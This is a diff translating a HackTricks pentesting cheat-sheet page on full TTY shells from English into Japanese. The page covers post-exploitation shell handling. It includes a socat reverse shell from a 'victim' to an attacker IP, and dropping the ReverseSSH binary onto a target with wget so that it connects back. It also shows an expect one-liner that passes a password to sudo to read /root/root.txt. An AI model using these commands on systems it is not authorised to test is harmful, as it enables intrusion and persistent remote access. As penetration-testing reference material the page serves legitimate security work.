@@ -1,20 +1,20 @@
-# Full TTYs
+# フルTTY
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
-## Full TTY
+## フルTTY
 
-Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Also, note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.
+`SHELL`変数で設定したシェルは、**必ず** _**/etc/shells**_ に**リストされている必要があります**。また、次のスニペットはbashでのみ動作します。zshの場合は、`bash`を実行してからシェルを取得してください。
 
 #### Python
 
@@ -27,10 +27,10 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 {% endcode %}
 
 {% hint style="info" %}
-You can get the **number** of **rows** and **columns** executing **`stty -a`**
+**`stty -a`**を実行すると、**行数**と**列数**を取得できます。
 {% endhint %}
 
-#### script
+#### スクリプト
 
 {% code overflow="wrap" %}
 ```bash
@@ -40,7 +40,6 @@ script /dev/null -qc /bin/bash #/dev/null is to not store anything
 {% endcode %}
 
 #### socat
-
 ```bash
 #Listener:
 socat file:`tty`,raw,echo=0 tcp-listen:4444
@@ -48,8 +47,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 #Victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
-
-### **Spawn shells**
+### **シェルの生成**
 
 * `python -c 'import pty; pty.spawn("/bin/sh")'`
 * `echo os.system('/bin/bash')`
@@ -66,11 +64,11 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-A convenient way for **interactive shell access**, as well as **file transfers** and **port forwarding**, is dropping the statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) onto the target.
+**インタラクティブなシェルアクセス**、**ファイル転送**、**ポートフォワーディング**の便利な方法は、ターゲットに静的リンクされたsshサーバー[ReverseSSH](https://github.com/Fahrj/reverse-ssh)をドロップすることです。
 
-Below is an example for `x86` with upx-compressed binaries. For other binaries, check [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+以下は、upx圧縮されたバイナリを使用した`x86`の例です。他のバイナリについては、[リリースページ](https://github.com/Fahrj/reverse-ssh/releases/latest/)を確認してください。
 
-1. Prepare locally to catch the ssh port forwarding request:
+1. ローカルでsshポートフォワーディングリクエストをキャッチするために準備します：
 
 {% code overflow="wrap" %}
 ```bash
@@ -81,9 +79,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2a) Linux target:
-
-{% code overflow="wrap" %}
+* (2a) Linuxのターゲット：
 ```bash
 # Drop it via your preferred way, e.g.
 wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
@@ -92,7 +88,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2b) Windows 10 target (for earlier versions, check [project readme](https://github.com/Fahrj/reverse-ssh#features)):
+* (2b) Windows 10のターゲット（以前のバージョンについては、[プロジェクトのreadme](https://github.com/Fahrj/reverse-ssh#features)を確認してください）：
 
 {% code overflow="wrap" %}
 ```bash
@@ -103,8 +99,7 @@ reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 {% endcode %}
 
-* If the ReverseSSH port forwarding request was successful, you should now be able to log in with the default password `letmeinbrudipls` in the context of the user running `reverse-ssh(.exe)`:
-
+* もしReverseSSHポートフォワーディングのリクエストが成功した場合、`reverse-ssh(.exe)`を実行しているユーザーのコンテキストでデフォルトのパスワード`letmeinbrudipls`でログインできるはずです。
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -112,23 +107,20 @@ ssh -p 8888 127.0.0.1
 # Bidirectional file transfer
 sftp -P 8888 127.0.0.1
 ```
+## TTYがない場合
 
-## No TTY
-
-If for some reason you cannot obtain a full TTY you **still can interact with programs** that expect user input. In the following example, the password is passed to `sudo` to read a file:
-
+何らかの理由で完全なTTYを取得できない場合でも、ユーザー入力を必要とするプログラムと**やり取りすることはできます**。次の例では、パスワードが`sudo`に渡されてファイルを読み取ります。
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝したいですか**？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロードしたいですか**？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **ハッキングのトリックを共有するために、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
